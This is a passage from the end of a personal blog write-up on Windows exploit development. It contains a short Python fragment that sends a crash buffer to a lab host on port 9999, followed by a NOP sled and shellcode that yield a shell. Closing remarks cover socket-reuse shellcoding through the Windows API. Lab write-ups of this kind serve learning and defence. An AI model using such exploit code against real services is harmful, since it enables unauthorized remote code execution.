s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))
s.send(command+crash)

time.sleep(5)

s.send("\x90" * (512-324) + shell)
s.close()
```

*In a muts like voice* "And we've got a shell. Nice.":

<img src="{{ site.url }}{{ site.baseurl }}/images/SHELLY.png" alt="">

Final Thoughts
---
I thought this was a pretty interesting technique. So much can be done with shellcoding and exploit development by utilizing the Windows API, as you cannot make a directly syscall (like Linux). Obviously, the file descriptor may be something to be concerned about, as it varies on operating systems. I have only ever seen a file descriptor that references a socket connection with either a value of __`80, 84, 88`__, or __`90`__.

Any questions or things I could have done better - please contact me. I am always open to constructive criticism.

Peace, love, and positivity :-)
